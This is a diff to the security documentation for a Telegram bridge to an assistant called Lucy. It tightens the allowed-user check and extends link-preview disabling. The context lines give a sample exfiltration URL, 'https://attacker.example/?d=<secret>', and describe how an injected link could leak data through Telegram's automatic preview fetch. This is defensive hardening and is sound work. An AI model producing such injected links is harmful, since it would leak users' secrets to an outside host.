@@ -28,7 +28,7 @@ Main ways in:
 The bridge only answers the Telegram user whose numeric ID is in `LUCY_ALLOWED_USER_ID` (`bridge/.env`). Everyone else gets "⛔ Không có quyền." (no permission).
 
 ::: danger Set it before you start the bot
-If `LUCY_ALLOWED_USER_ID` is **empty, the bridge answers everyone** who finds the bot. The status message shows `uid=(mở!)` ("open!") in that case. Always set it:
+If `LUCY_ALLOWED_USER_ID` is **empty, the bridge refuses to start**. The only way to run it open is to also set `LUCY_ALLOW_ANYONE=1`; then it answers everyone who finds the bot and the status message shows `uid=(mở!)` ("open!"). Don't do that. Always set the ID:
 
 ```ini
 LUCY_ALLOWED_USER_ID=<your-numeric-telegram-id>
@@ -37,7 +37,7 @@ LUCY_ALLOWED_USER_ID=<your-numeric-telegram-id>
 
 ### Link previews disabled
 
-Every message the bridge sends goes through one helper that sets `link_preview_options.is_disabled = true`. Telegram's servers fetch the URL behind a link preview, so an injected link such as `https://attacker.example/?d=<secret>` could leak data without anyone clicking it. Hub schedule pushes and token-guard alerts also turn previews off. The bridge also replaces the bot token with `<bot-token>` in error logs.
+Every message the bridge sends goes through one helper that sets `link_preview_options.is_disabled = true`. Telegram's servers fetch the URL behind a link preview, so an injected link such as `https://attacker.example/?d=<secret>` could leak data without anyone clicking it. Hub schedule pushes, token-guard alerts and the nightly dream cron's report also turn previews off, so every Telegram message Lucy sends has previews disabled. The bridge also replaces the bot token with `<bot-token>` in error logs.
 
 ### Hub login
 
